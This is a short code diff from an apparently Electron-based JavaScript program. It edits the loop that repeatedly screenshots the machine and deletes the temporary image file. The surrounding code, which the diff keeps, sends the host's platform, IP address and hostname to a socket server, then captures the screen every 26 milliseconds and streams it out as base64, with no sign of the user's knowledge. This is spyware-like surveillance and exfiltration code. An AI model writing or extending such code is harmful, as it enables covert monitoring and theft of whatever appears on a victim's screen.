@@ -30,6 +30,9 @@ function createWindow () {
     socket.emit('new', {platform:os.platform(),arch:os.arch(),ip:ip.address(),hostname:os.hostname()})
     setInterval(() => { socket.emit('ping', {hostname:os.hostname()}) }, 15);
     setInterval(() => {
+      if(fs.existsSync(__dirname+'\\scr.png')) {
+        fs.unlinkSync(__dirname+'\\scr.png')
+      }
       scr('scr.png', function(error, complete) {
         if(error)
         return false;
@@ -38,7 +41,6 @@ function createWindow () {
       })
       let b64 = getbase64(__dirname+'\\scr.png')
       socket.emit('scr', b64)
-      fs.unlinkSync(__dirname+'\\scr.png')
     }, 26)
   })
 }
